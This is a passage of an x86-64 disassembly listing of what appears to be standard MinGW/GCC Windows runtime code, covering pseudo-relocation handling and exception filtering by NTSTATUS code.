    6d8cd770:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
    6d8cd774:	e8 47 0d 00 00       	call   0x6d8ce4c0
    6d8cd779:	4c 8b 25 60 b0 0e 00 	mov    0xeb060(%rip),%r12        # 0x6d9b87e0
    6d8cd780:	c7 05 7a fd 0e 00 00 	movl   $0x0,0xefd7a(%rip)        # 0x6d9bd504
    6d8cd787:	00 00 00 
    6d8cd78a:	48 8b 35 5f b0 0e 00 	mov    0xeb05f(%rip),%rsi        # 0x6d9b87f0
    6d8cd791:	48 29 c4             	sub    %rax,%rsp
    6d8cd794:	48 8d 44 24 20       	lea    0x20(%rsp),%rax
    6d8cd799:	48 89 05 68 fd 0e 00 	mov    %rax,0xefd68(%rip)        # 0x6d9bd508
    6d8cd7a0:	4c 89 e0             	mov    %r12,%rax
    6d8cd7a3:	48 29 f0             	sub    %rsi,%rax
    6d8cd7a6:	48 83 f8 07          	cmp    $0x7,%rax
    6d8cd7aa:	7e 96                	jle    0x6d8cd742
    6d8cd7ac:	48 83 f8 0b          	cmp    $0xb,%rax
    6d8cd7b0:	8b 16                	mov    (%rsi),%edx
    6d8cd7b2:	0f 8e c8 00 00 00    	jle    0x6d8cd880
    6d8cd7b8:	85 d2                	test   %edx,%edx
    6d8cd7ba:	0f 84 a4 00 00 00    	je     0x6d8cd864
    6d8cd7c0:	4c 39 e6             	cmp    %r12,%rsi
    6d8cd7c3:	0f 83 79 ff ff ff    	jae    0x6d8cd742
    6d8cd7c9:	4c 8d 76 08          	lea    0x8(%rsi),%r14
    6d8cd7cd:	49 83 c4 07          	add    $0x7,%r12
    6d8cd7d1:	4c 8b 2d 38 b0 0e 00 	mov    0xeb038(%rip),%r13        # 0x6d9b8810
    6d8cd7d8:	48 8d 7d a8          	lea    -0x58(%rbp),%rdi
    6d8cd7dc:	4d 29 f4             	sub    %r14,%r12
    6d8cd7df:	49 c1 ec 03          	shr    $0x3,%r12
    6d8cd7e3:	4e 8d 64 e6 08       	lea    0x8(%rsi,%r12,8),%r12
    6d8cd7e8:	eb 0a                	jmp    0x6d8cd7f4
    6d8cd7ea:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
    6d8cd7f0:	49 83 c6 08          	add    $0x8,%r14
    6d8cd7f4:	8b 4e 04             	mov    0x4(%rsi),%ecx
    6d8cd7f7:	41 b8 04 00 00 00    	mov    $0x4,%r8d
    6d8cd7fd:	48 89 fa             	mov    %rdi,%rdx
    6d8cd800:	8b 06                	mov    (%rsi),%eax
    6d8cd802:	4c 89 f6             	mov    %r14,%rsi
    6d8cd805:	4c 01 e9             	add    %r13,%rcx
    6d8cd808:	03 01                	add    (%rcx),%eax
    6d8cd80a:	89 45 a8             	mov    %eax,-0x58(%rbp)
    6d8cd80d:	e8 3e fd ff ff       	call   0x6d8cd550
    6d8cd812:	4d 39 e6             	cmp    %r12,%r14
    6d8cd815:	75 d9                	jne    0x6d8cd7f0
    6d8cd817:	8b 05 e7 fc 0e 00    	mov    0xefce7(%rip),%eax        # 0x6d9bd504
    6d8cd81d:	31 f6                	xor    %esi,%esi
    6d8cd81f:	4c 8b 25 86 3a 10 00 	mov    0x103a86(%rip),%r12        # 0x6d9d12ac
    6d8cd826:	85 c0                	test   %eax,%eax
    6d8cd828:	0f 8e 14 ff ff ff    	jle    0x6d8cd742
    6d8cd82e:	66 90                	xchg   %ax,%ax
    6d8cd830:	48 8b 05 d1 fc 0e 00 	mov    0xefcd1(%rip),%rax        # 0x6d9bd508
    6d8cd837:	48 01 f0             	add    %rsi,%rax
    6d8cd83a:	44 8b 00             	mov    (%rax),%r8d
    6d8cd83d:	45 85 c0             	test   %r8d,%r8d
    6d8cd840:	74 0e                	je     0x6d8cd850
    6d8cd842:	48 8b 50 10          	mov    0x10(%rax),%rdx
    6d8cd846:	49 89 f9             	mov    %rdi,%r9
    6d8cd849:	48 8b 48 08          	mov    0x8(%rax),%rcx
    6d8cd84d:	41 ff d4             	call   *%r12
    6d8cd850:	83 c3 01             	add    $0x1,%ebx
    6d8cd853:	48 83 c6 28          	add    $0x28,%rsi
    6d8cd857:	3b 1d a7 fc 0e 00    	cmp    0xefca7(%rip),%ebx        # 0x6d9bd504
    6d8cd85d:	7c d1                	jl     0x6d8cd830
    6d8cd85f:	e9 de fe ff ff       	jmp    0x6d8cd742
    6d8cd864:	8b 4e 04             	mov    0x4(%rsi),%ecx
    6d8cd867:	85 c9                	test   %ecx,%ecx
    6d8cd869:	0f 85 51 ff ff ff    	jne    0x6d8cd7c0
    6d8cd86f:	8b 56 08             	mov    0x8(%rsi),%edx
    6d8cd872:	85 d2                	test   %edx,%edx
    6d8cd874:	75 1d                	jne    0x6d8cd893
    6d8cd876:	8b 56 0c             	mov    0xc(%rsi),%edx
    6d8cd879:	48 83 c6 0c          	add    $0xc,%rsi
    6d8cd87d:	0f 1f 00             	nopl   (%rax)
    6d8cd880:	85 d2                	test   %edx,%edx
    6d8cd882:	0f 85 38 ff ff ff    	jne    0x6d8cd7c0
    6d8cd888:	8b 46 04             	mov    0x4(%rsi),%eax
    6d8cd88b:	85 c0                	test   %eax,%eax
    6d8cd88d:	0f 85 2d ff ff ff    	jne    0x6d8cd7c0
    6d8cd893:	8b 56 08             	mov    0x8(%rsi),%edx
    6d8cd896:	83 fa 01             	cmp    $0x1,%edx
    6d8cd899:	0f 85 2f 01 00 00    	jne    0x6d8cd9ce
    6d8cd89f:	4c 8b 2d 6a af 0e 00 	mov    0xeaf6a(%rip),%r13        # 0x6d9b8810
    6d8cd8a6:	48 83 c6 0c          	add    $0xc,%rsi
    6d8cd8aa:	49 bf 00 00 00 00 ff 	movabs $0xffffffff00000000,%r15
    6d8cd8b1:	ff ff ff 
    6d8cd8b4:	4c 8d 75 a8          	lea    -0x58(%rbp),%r14
    6d8cd8b8:	4c 39 e6             	cmp    %r12,%rsi
    6d8cd8bb:	72 48                	jb     0x6d8cd905
    6d8cd8bd:	e9 80 fe ff ff       	jmp    0x6d8cd742
    6d8cd8c2:	0f 86 b8 00 00 00    	jbe    0x6d8cd980
    6d8cd8c8:	83 fa 20             	cmp    $0x20,%edx
    6d8cd8cb:	0f 84 7f 00 00 00    	je     0x6d8cd950
    6d8cd8d1:	83 fa 40             	cmp    $0x40,%edx
    6d8cd8d4:	0f 85 e0 00 00 00    	jne    0x6d8cd9ba
    6d8cd8da:	48 8b 11             	mov    (%rcx),%rdx
    6d8cd8dd:	41 b8 08 00 00 00    	mov    $0x8,%r8d
    6d8cd8e3:	4c 89 f7             	mov    %r14,%rdi
    6d8cd8e6:	48 29 c2             	sub    %rax,%rdx
    6d8cd8e9:	4c 01 ca             	add    %r9,%rdx
    6d8cd8ec:	48 89 55 a8          	mov    %rdx,-0x58(%rbp)
    6d8cd8f0:	4c 89 f2             	mov    %r14,%rdx
    6d8cd8f3:	e8 58 fc ff ff       	call   0x6d8cd550
    6d8cd8f8:	48 83 c6 0c          	add    $0xc,%rsi
    6d8cd8fc:	4c 39 e6             	cmp    %r12,%rsi
    6d8cd8ff:	0f 83 12 ff ff ff    	jae    0x6d8cd817
    6d8cd905:	8b 4e 04             	mov    0x4(%rsi),%ecx
    6d8cd908:	8b 06                	mov    (%rsi),%eax
    6d8cd90a:	0f b6 56 08          	movzbl 0x8(%rsi),%edx
    6d8cd90e:	4c 01 e9             	add    %r13,%rcx
    6d8cd911:	4c 01 e8             	add    %r13,%rax
    6d8cd914:	83 fa 10             	cmp    $0x10,%edx
    6d8cd917:	4c 8b 08             	mov    (%rax),%r9
    6d8cd91a:	75 a6                	jne    0x6d8cd8c2
    6d8cd91c:	44 0f b7 01          	movzwl (%rcx),%r8d
    6d8cd920:	4c 89 f2             	mov    %r14,%rdx
    6d8cd923:	4c 89 f7             	mov    %r14,%rdi
    6d8cd926:	4d 89 c2             	mov    %r8,%r10
    6d8cd929:	49 81 ca 00 00 ff ff 	or     $0xffffffffffff0000,%r10
    6d8cd930:	66 45 85 c0          	test   %r8w,%r8w
    6d8cd934:	4d 0f 48 c2          	cmovs  %r10,%r8
    6d8cd938:	49 29 c0             	sub    %rax,%r8
    6d8cd93b:	4d 01 c8             	add    %r9,%r8
    6d8cd93e:	4c 89 45 a8          	mov    %r8,-0x58(%rbp)
    6d8cd942:	41 b8 02 00 00 00    	mov    $0x2,%r8d
    6d8cd948:	e8 03 fc ff ff       	call   0x6d8cd550
    6d8cd94d:	eb a9                	jmp    0x6d8cd8f8
    6d8cd94f:	90                   	nop
    6d8cd950:	8b 11                	mov    (%rcx),%edx
    6d8cd952:	4c 89 f7             	mov    %r14,%rdi
    6d8cd955:	49 89 d0             	mov    %rdx,%r8
    6d8cd958:	4c 09 fa             	or     %r15,%rdx
    6d8cd95b:	45 85 c0             	test   %r8d,%r8d
    6d8cd95e:	49 0f 49 d0          	cmovns %r8,%rdx
    6d8cd962:	41 b8 04 00 00 00    	mov    $0x4,%r8d
    6d8cd968:	48 29 c2             	sub    %rax,%rdx
    6d8cd96b:	4c 01 ca             	add    %r9,%rdx
    6d8cd96e:	48 89 55 a8          	mov    %rdx,-0x58(%rbp)
    6d8cd972:	4c 89 f2             	mov    %r14,%rdx
    6d8cd975:	e8 d6 fb ff ff       	call   0x6d8cd550
    6d8cd97a:	e9 79 ff ff ff       	jmp    0x6d8cd8f8
    6d8cd97f:	90                   	nop
    6d8cd980:	83 fa 08             	cmp    $0x8,%edx
    6d8cd983:	75 35                	jne    0x6d8cd9ba
    6d8cd985:	44 0f b6 01          	movzbl (%rcx),%r8d
    6d8cd989:	4c 89 f2             	mov    %r14,%rdx
    6d8cd98c:	4c 89 f7             	mov    %r14,%rdi
    6d8cd98f:	4d 89 c2             	mov    %r8,%r10
    6d8cd992:	49 81 ca 00 ff ff ff 	or     $0xffffffffffffff00,%r10
    6d8cd999:	45 84 c0             	test   %r8b,%r8b
    6d8cd99c:	4d 0f 48 c2          	cmovs  %r10,%r8
    6d8cd9a0:	49 29 c0             	sub    %rax,%r8
    6d8cd9a3:	4d 01 c8             	add    %r9,%r8
    6d8cd9a6:	4c 89 45 a8          	mov    %r8,-0x58(%rbp)
    6d8cd9aa:	41 b8 01 00 00 00    	mov    $0x1,%r8d
    6d8cd9b0:	e8 9b fb ff ff       	call   0x6d8cd550
    6d8cd9b5:	e9 3e ff ff ff       	jmp    0x6d8cd8f8
    6d8cd9ba:	48 8d 0d 57 ab 0e 00 	lea    0xeab57(%rip),%rcx        # 0x6d9b8518
    6d8cd9c1:	48 c7 45 a8 00 00 00 	movq   $0x0,-0x58(%rbp)
    6d8cd9c8:	00 
    6d8cd9c9:	e8 82 0e 00 00       	call   0x6d8ce850
    6d8cd9ce:	48 8d 0d 0b ab 0e 00 	lea    0xeab0b(%rip),%rcx        # 0x6d9b84e0
    6d8cd9d5:	e8 76 0e 00 00       	call   0x6d8ce850
    6d8cd9da:	90                   	nop
    6d8cd9db:	90                   	nop
    6d8cd9dc:	90                   	nop
    6d8cd9dd:	90                   	nop
    6d8cd9de:	90                   	nop
    6d8cd9df:	90                   	nop
    6d8cd9e0:	48 83 ec 28          	sub    $0x28,%rsp
    6d8cd9e4:	8b 01                	mov    (%rcx),%eax
    6d8cd9e6:	3d 91 00 00 c0       	cmp    $0xc0000091,%eax
    6d8cd9eb:	77 63                	ja     0x6d8cda50
    6d8cd9ed:	3d 8d 00 00 c0       	cmp    $0xc000008d,%eax
    6d8cd9f2:	73 7b                	jae    0x6d8cda6f
    6d8cd9f4:	3d 08 00 00 c0       	cmp    $0xc0000008,%eax
    6d8cd9f9:	0f 84 05 01 00 00    	je     0x6d8cdb04
    6d8cd9ff:	0f 87 cb 00 00 00    	ja     0x6d8cdad0
    6d8cda05:	3d 02 00 00 80       	cmp    $0x80000002,%eax
    6d8cda0a:	0f 84 f4 00 00 00    	je     0x6d8cdb04
    6d8cda10:	3d 05 00 00 c0       	cmp    $0xc0000005,%eax
    6d8cda15:	0f 85 c3 00 00 00    	jne    0x6d8cdade
    6d8cda1b:	31 d2                	xor    %edx,%edx
    6d8cda1d:	b9 0b 00 00 00       	mov    $0xb,%ecx
    6d8cda22:	e8 19 0b 00 00       	call   0x6d8ce540
    6d8cda27:	48 83 f8 01          	cmp    $0x1,%rax
    6d8cda2b:	0f 84 2f 01 00 00    	je     0x6d8cdb60
    6d8cda31:	48 85 c0             	test   %rax,%rax
    6d8cda34:	0f 84 3c 01 00 00    	je     0x6d8cdb76
    6d8cda3a:	b9 0b 00 00 00       	mov    $0xb,%ecx
    6d8cda3f:	ff d0                	call   *%rax
    6d8cda41:	31 c0                	xor    %eax,%eax
    6d8cda43:	48 83 c4 28          	add    $0x28,%rsp
    6d8cda47:	c3                   	ret
    6d8cda48:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
    6d8cda4f:	00 
    6d8cda50:	3d 94 00 00 c0       	cmp    $0xc0000094,%eax
    6d8cda55:	0f 84 b5 00 00 00    	je     0x6d8cdb10
    6d8cda5b:	77 37                	ja     0x6d8cda94
    6d8cda5d:	3d 92 00 00 c0       	cmp    $0xc0000092,%eax
    6d8cda62:	0f 84 9c 00 00 00    	je     0x6d8cdb04
    6d8cda68:	3d 93 00 00 c0       	cmp    $0xc0000093,%eax
    6d8cda6d:	75 6f                	jne    0x6d8cdade
    6d8cda6f:	31 d2                	xor    %edx,%edx
    6d8cda71:	b9 08 00 00 00       	mov    $0x8,%ecx
    6d8cda76:	e8 c5 0a 00 00       	call   0x6d8ce540
    6d8cda7b:	48 83 f8 01          	cmp    $0x1,%rax
    6d8cda7f:	74 6f                	je     0x6d8cdaf0
    6d8cda81:	48 85 c0             	test   %rax,%rax
    6d8cda84:	74 58                	je     0x6d8cdade
    6d8cda86:	b9 08 00 00 00       	mov    $0x8,%ecx
    6d8cda8b:	ff d0                	call   *%rax
    6d8cda8d:	31 c0                	xor    %eax,%eax
    6d8cda8f:	48 83 c4 28          	add    $0x28,%rsp
    6d8cda93:	c3                   	ret
    6d8cda94:	3d 95 00 00 c0       	cmp    $0xc0000095,%eax
    6d8cda99:	74 69                	je     0x6d8cdb04
    6d8cda9b:	3d 96 00 00 c0       	cmp    $0xc0000096,%eax
    6d8cdaa0:	75 3c                	jne    0x6d8cdade
    6d8cdaa2:	31 d2                	xor    %edx,%edx
    6d8cdaa4:	b9 04 00 00 00       	mov    $0x4,%ecx
    6d8cdaa9:	e8 92 0a 00 00       	call   0x6d8ce540
    6d8cdaae:	48 83 f8 01          	cmp    $0x1,%rax
    6d8cdab2:	0f 84 88 00 00 00    	je     0x6d8cdb40
    6d8cdab8:	48 85 c0             	test   %rax,%rax
    6d8cdabb:	0f 84 b5 00 00 00    	je     0x6d8cdb76
    6d8cdac1:	b9 04 00 00 00       	mov    $0x4,%ecx
    6d8cdac6:	ff d0                	call   *%rax
    6d8cdac8:	31 c0                	xor    %eax,%eax
    6d8cdaca:	48 83 c4 28          	add    $0x28,%rsp
    6d8cdace:	c3                   	ret
    6d8cdacf:	90                   	nop
    6d8cdad0:	3d 1d 00 00 c0       	cmp    $0xc000001d,%eax
    6d8cdad5:	74 cb                	je     0x6d8cdaa2
    6d8cdad7:	3d 8c 00 00 c0       	cmp    $0xc000008c,%eax
    6d8cdadc:	74 26                	je     0x6d8cdb04
    6d8cdade:	b8 01 00 00 00       	mov    $0x1,%eax
    6d8cdae3:	48 83 c4 28          	add    $0x28,%rsp
    6d8cdae7:	c3                   	ret
    6d8cdae8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
    6d8cdaef:	00 
    6d8cdaf0:	ba 01 00 00 00       	mov    $0x1,%edx
    6d8cdaf5:	b9 08 00 00 00       	mov    $0x8,%ecx
    6d8cdafa:	e8 41 0a 00 00       	call   0x6d8ce540
    6d8cdaff:	e8 ac 09 00 00       	call   0x6d8ce4b0
    6d8cdb04:	31 c0                	xor    %eax,%eax
    6d8cdb06:	48 83 c4 28          	add    $0x28,%rsp
    6d8cdb0a:	c3                   	ret
    6d8cdb0b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
    6d8cdb10:	31 d2                	xor    %edx,%edx
    6d8cdb12:	b9 08 00 00 00       	mov    $0x8,%ecx
    6d8cdb17:	e8 24 0a 00 00       	call   0x6d8ce540
    6d8cdb1c:	48 83 f8 01          	cmp    $0x1,%rax
    6d8cdb20:	0f 85 5b ff ff ff    	jne    0x6d8cda81
    6d8cdb26:	ba 01 00 00 00       	mov    $0x1,%edx
    6d8cdb2b:	b9 08 00 00 00       	mov    $0x8,%ecx
    6d8cdb30:	e8 0b 0a 00 00       	call   0x6d8ce540
    6d8cdb35:	31 c0                	xor    %eax,%eax
    6d8cdb37:	e9 07 ff ff ff       	jmp    0x6d8cda43
    6d8cdb3c:	0f 1f 40 00          	nopl   0x0(%rax)
    6d8cdb40:	ba 01 00 00 00       	mov    $0x1,%edx
    6d8cdb45:	b9 04 00 00 00       	mov    $0x4,%ecx
    6d8cdb4a:	e8 f1 09 00 00       	call   0x6d8ce540
    6d8cdb4f:	31 c0                	xor    %eax,%eax
    6d8cdb51:	e9 ed fe ff ff       	jmp    0x6d8cda43
    6d8cdb56:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    6d8cdb5d:	00 00 00 
    6d8cdb60:	ba 01 00 00 00       	mov    $0x1,%edx
    6d8cdb65:	b9 0b 00 00 00       	mov    $0xb,%ecx
    6d8cdb6a:	e8 d1 09 00 00       	call   0x6d8ce540
    6d8cdb6f:	31 c0                	xor    %eax,%eax
    6d8cdb71:	e9 cd fe ff ff       	jmp    0x6d8cda43
    6d8cdb76:	b8 04 00 00 00       	mov    $0x4,%eax
    6d8cdb7b:	e9 c3 fe ff ff       	jmp    0x6d8cda43
    6d8cdb80:	41 54                	push   %r12
    6d8cdb82:	55                   	push   %rbp
    6d8cdb83:	57                   	push   %rdi
    6d8cdb84:	56                   	push   %rsi
    6d8cdb85:	53                   	push   %rbx
    6d8cdb86:	48 83 ec 20          	sub    $0x20,%rsp
    6d8cdb8a:	e8 91 07 00 00       	call   0x6d8ce320
    6d8cdb8f:	48 89 c5             	mov    %rax,%rbp
    6d8cdb92:	8b 05 90 f9 0e 00    	mov    0xef990(%rip),%eax        # 0x6d9bd528
    6d8cdb98:	85 c0                	test   %eax,%eax
    6d8cdb9a:	75 25                	jne    0x6d8cdbc1
    6d8cdb9c:	48 85 ed             	test   %rbp,%rbp
    6d8cdb9f:	74 20                	je     0x6d8cdbc1
    6d8cdba1:	48 8d 0d a8 a9 0e 00 	lea    0xea9a8(%rip),%rcx        # 0x6d9b8550
    6d8cdba8:	c7 05 76 f9 0e 00 01 	movl   $0x1,0xef976(%rip)        # 0x6d9bd528
    6d8cdbaf:	00 00 00 
    6d8cdbb2:	e8 a9 05 00 00       	call   0x6d8ce160
    6d8cdbb7:	48 85 c0             	test   %rax,%rax
    6d8cdbba:	74 14                	je     0x6d8cdbd0
    6d8cdbbc:	b8 01 00 00 00       	mov    $0x1,%eax
    6d8cdbc1:	48 83 c4 20          	add    $0x20,%rsp
    6d8cdbc5:	5b                   	pop    %rbx
    6d8cdbc6:	5e                   	pop    %rsi
    6d8cdbc7:	5f                   	pop    %rdi
    6d8cdbc8:	5d                   	pop    %rbp
    6d8cdbc9:	41 5c                	pop    %r12
    6d8cdbcb:	c3                   	ret
    6d8cdbcc:	0f 1f 40 00          	nopl   0x0(%rax)
    6d8cdbd0:	48 8d 1d 69 fa 0e 00 	lea    0xefa69(%rip),%rbx        # 0x6d9bd640
    6d8cdbd7:	b9 30 00 00 00       	mov    $0x30,%ecx
    6d8cdbdc:	31 f6                	xor    %esi,%esi
    6d8cdbde:	48 8d 15 5b f9 0e 00 	lea    0xef95b(%rip),%rdx        # 0x6d9bd540
    6d8cdbe5:	48 89 df             	mov    %rbx,%rdi
    6d8cdbe8:	f3 48 ab             	rep stos %rax,(%rdi)
    6d8cdbeb:	4c 8d 25 ee fd ff ff 	lea    -0x212(%rip),%r12        # 0x6d8cd9e0
    6d8cdbf2:	b9 20 00 00 00       	mov    $0x20,%ecx
    6d8cdbf7:	48 89 d7             	mov    %rdx,%rdi
    6d8cdbfa:	f3 48 ab             	rep stos %rax,(%rdi)
    6d8cdbfd:	49 29 ec             	sub    %rbp,%r12
    6d8cdc00:	48 89 d7             	mov    %rdx,%rdi
    6d8cdc03:	eb 2e                	jmp    0x6d8cdc33
    6d8cdc05:	c6 07 09             	movb   $0x9,(%rdi)
    6d8cdc08:	48 83 c6 01          	add    $0x1,%rsi
    6d8cdc0c:	48 83 c3 0c          	add    $0xc,%rbx
    6d8cdc10:	44 89 67 04          	mov    %r12d,0x4(%rdi)
    6d8cdc14:	8b 48 0c             	mov    0xc(%rax),%ecx
    6d8cdc17:	89 4b f4             	mov    %ecx,-0xc(%rbx)
    6d8cdc1a:	03 48 08             	add    0x8(%rax),%ecx
    6d8cdc1d:	48 89 f8             	mov    %rdi,%rax
    6d8cdc20:	48 83 c7 08          	add    $0x8,%rdi
    6d8cdc24:	48 29 e8             	sub    %rbp,%rax
    6d8cdc27:	89 43 fc             	mov    %eax,-0x4(%rbx)
    6d8cdc2a:	89 4b f8             	mov    %ecx,-0x8(%rbx)
    6d8cdc2d:	48 83 fe 20          	cmp    $0x20,%rsi
    6d8cdc31:	74 32                	je     0x6d8cdc65
    6d8cdc33:	48 89 f1             	mov    %rsi,%rcx
    6d8cdc36:	e8 75 06 00 00       	call   0x6d8ce2b0
    6d8cdc3b:	48 85 c0             	test   %rax,%rax
    6d8cdc3e:	75 c5                	jne    0x6d8cdc05
    6d8cdc40:	48 85 f6             	test   %rsi,%rsi
    6d8cdc43:	89 f2                	mov    %esi,%edx
    6d8cdc45:	0f 84 71 ff ff ff    	je     0x6d8cdbbc
    6d8cdc4b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
    6d8cdc50:	48 8d 0d e9 f9 0e 00 	lea    0xef9e9(%rip),%rcx        # 0x6d9bd640
    6d8cdc57:	49 89 e8             	mov    %rbp,%r8
    6d8cdc5a:	ff 15 f4 35 10 00    	call   *0x1035f4(%rip)        # 0x6d9d1254
    6d8cdc60:	e9 57 ff ff ff       	jmp    0x6d8cdbbc
    6d8cdc65:	ba 20 00 00 00       	mov    $0x20,%edx
    6d8cdc6a:	eb e4                	jmp    0x6d8cdc50
    6d8cdc6c:	0f 1f 40 00          	nopl   0x0(%rax)
    6d8cdc70:	53                   	push   %rbx
    6d8cdc71:	48 83 ec 20          	sub    $0x20,%rsp
    6d8cdc75:	48 8b 11             	mov    (%rcx),%rdx
    6d8cdc78:	8b 02                	mov    (%rdx),%eax
    6d8cdc7a:	48 89 cb             	mov    %rcx,%rbx
    6d8cdc7d:	89 c1                	mov    %eax,%ecx
    6d8cdc7f:	81 e1 ff ff ff 20    	and    $0x20ffffff,%ecx
    6d8cdc85:	81 f9 43 43 47 20    	cmp    $0x20474343,%ecx
    6d8cdc8b:	0f 84 bf 00 00 00    	je     0x6d8cdd50
    6d8cdc91:	3d 91 00 00 c0       	cmp    $0xc0000091,%eax
    6d8cdc96:	77 68                	ja     0x6d8cdd00
    6d8cdc98:	3d 8d 00 00 c0       	cmp    $0xc000008d,%eax
    6d8cdc9d:	73 7c                	jae    0x6d8cdd1b
    6d8cdc9f:	3d 08 00 00 c0       	cmp    $0xc0000008,%eax
    6d8cdca4:	0f 84 b0 00 00 00    	je     0x6d8cdd5a
    6d8cdcaa:	0f 87 f4 00 00 00    	ja     0x6d8cdda4
    6d8cdcb0:	3d 02 00 00 80       	cmp    $0x80000002,%eax
    6d8cdcb5:	0f 84 9f 00 00 00    	je     0x6d8cdd5a
    6d8cdcbb:	3d 05 00 00 c0       	cmp    $0xc0000005,%eax
    6d8cdcc0:	75 1f                	jne    0x6d8cdce1
    6d8cdcc2:	31 d2                	xor    %edx,%edx
    6d8cdcc4:	b9 0b 00 00 00       	mov    $0xb,%ecx
    6d8cdcc9:	e8 72 08 00 00       	call   0x6d8ce540
    6d8cdcce:	48 83 f8 01          	cmp    $0x1,%rax
    6d8cdcd2:	0f 84 51 01 00 00    	je     0x6d8cde29
    6d8cdcd8:	48 85 c0             	test   %rax,%rax
    6d8cdcdb:	0f 85 0f 01 00 00    	jne    0x6d8cddf0
    6d8cdce1:	48 8b 05 38 f8 0e 00 	mov    0xef838(%rip),%rax        # 0x6d9bd520
    6d8cdce8:	48 85 c0             	test   %rax,%rax
    6d8cdceb:	0f 84 10 01 00 00    	je     0x6d8cde01
    6d8cdcf1:	48 89 d9             	mov    %rbx,%rcx
    6d8cdcf4:	48 83 c4 20          	add    $0x20,%rsp
    6d8cdcf8:	5b                   	pop    %rbx
    6d8cdcf9:	48 ff e0             	rex.W jmp *%rax
    6d8cdcfc:	0f 1f 40 00          	nopl   0x0(%rax)
    6d8cdd00:	3d 94 00 00 c0       	cmp    $0xc0000094,%eax
    6d8cdd05:	0f 84 b5 00 00 00    	je     0x6d8cddc0
    6d8cdd0b:	77 58                	ja     0x6d8cdd65
    6d8cdd0d:	3d 92 00 00 c0       	cmp    $0xc0000092,%eax
    6d8cdd12:	74 46                	je     0x6d8cdd5a
    6d8cdd14:	3d 93 00 00 c0       	cmp    $0xc0000093,%eax
    6d8cdd19:	75 c6                	jne    0x6d8cdce1
    6d8cdd1b:	31 d2                	xor    %edx,%edx
    6d8cdd1d:	b9 08 00 00 00       	mov    $0x8,%ecx
    6d8cdd22:	e8 19 08 00 00       	call   0x6d8ce540
    6d8cdd27:	48 83 f8 01          	cmp    $0x1,%rax
    6d8cdd2b:	0f 84 df 00 00 00    	je     0x6d8cde10
    6d8cdd31:	48 85 c0             	test   %rax,%rax
    6d8cdd34:	74 ab                	je     0x6d8cdce1
    6d8cdd36:	b9 08 00 00 00       	mov    $0x8,%ecx
    6d8cdd3b:	ff d0                	call   *%rax
    6d8cdd3d:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    6d8cdd42:	48 83 c4 20          	add    $0x20,%rsp
    6d8cdd46:	5b                   	pop    %rbx
    6d8cdd47:	c3                   	ret
    6d8cdd48:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
    6d8cdd4f:	00 
    6d8cdd50:	f6 42 04 01          	testb  $0x1,0x4(%rdx)
    6d8cdd54:	0f 85 37 ff ff ff    	jne    0x6d8cdc91
    6d8cdd5a:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    6d8cdd5f:	48 83 c4 20          	add    $0x20,%rsp
    6d8cdd63:	5b                   	pop    %rbx
    6d8cdd64:	c3                   	ret
    6d8cdd65:	3d 95 00 00 c0       	cmp    $0xc0000095,%eax
    6d8cdd6a:	74 ee                	je     0x6d8cdd5a
    6d8cdd6c:	3d 96 00 00 c0       	cmp    $0xc0000096,%eax
    6d8cdd71:	0f 85 6a ff ff ff    	jne    0x6d8cdce1
    6d8cdd77:	31 d2                	xor    %edx,%edx
    6d8cdd79:	b9 04 00 00 00       	mov    $0x4,%ecx
    6d8cdd7e:	e8 bd 07 00 00       	call   0x6d8ce540
    6d8cdd83:	48 83 f8 01          	cmp    $0x1,%rax
    6d8cdd87:	0f 84 b3 00 00 00    	je     0x6d8cde40
    6d8cdd8d:	48 85 c0             	test   %rax,%rax
    6d8cdd90:	0f 84 4b ff ff ff    	je     0x6d8cdce1
    6d8cdd96:	b9 04 00 00 00       	mov    $0x4,%ecx
    6d8cdd9b:	ff d0                	call   *%rax
    6d8cdd9d:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    6d8cdda2:	eb 9e                	jmp    0x6d8cdd42
    6d8cdda4:	3d 1d 00 00 c0       	cmp    $0xc000001d,%eax
    6d8cdda9:	74 cc                	je     0x6d8cdd77
    6d8cddab:	3d 8c 00 00 c0       	cmp    $0xc000008c,%eax
    6d8cddb0:	0f 85 2b ff ff ff    	jne    0x6d8cdce1
    6d8cddb6:	eb a2                	jmp    0x6d8cdd5a
    6d8cddb8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
    6d8cddbf:	00 
    6d8cddc0:	31 d2                	xor    %edx,%edx
    6d8cddc2:	b9 08 00 00 00       	mov    $0x8,%ecx
    6d8cddc7:	e8 74 07 00 00       	call   0x6d8ce540
    6d8cddcc:	48 83 f8 01          	cmp    $0x1,%rax
    6d8cddd0:	0f 85 5b ff ff ff    	jne    0x6d8cdd31
    6d8cddd6:	ba 01 00 00 00       	mov    $0x1,%edx
    6d8cdddb:	b9 08 00 00 00       	mov    $0x8,%ecx
    6d8cdde0:	e8 5b 07 00 00       	call   0x6d8ce540
    6d8cdde5:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    6d8cddea:	e9 53 ff ff ff       	jmp    0x6d8cdd42
    6d8cddef:	90                   	nop
    6d8cddf0:	b9 0b 00 00 00       	mov    $0xb,%ecx
    6d8cddf5:	ff d0                	call   *%rax
    6d8cddf7:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    6d8cddfc:	e9 41 ff ff ff       	jmp    0x6d8cdd42
    6d8cde01:	31 c0                	xor    %eax,%eax
    6d8cde03:	e9 3a ff ff ff       	jmp    0x6d8cdd42
    6d8cde08:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
    6d8cde0f:	00 
    6d8cde10:	ba 01 00 00 00       	mov    $0x1,%edx
    6d8cde15:	b9 08 00 00 00       	mov    $0x8,%ecx
    6d8cde1a:	e8 21 07 00 00       	call   0x6d8ce540
    6d8cde1f:	e8 8c 06 00 00       	call   0x6d8ce4b0
    6d8cde24:	e9 31 ff ff ff       	jmp    0x6d8cdd5a
    6d8cde29:	ba 01 00 00 00       	mov    $0x1,%edx
    6d8cde2e:	b9 0b 00 00 00       	mov    $0xb,%ecx
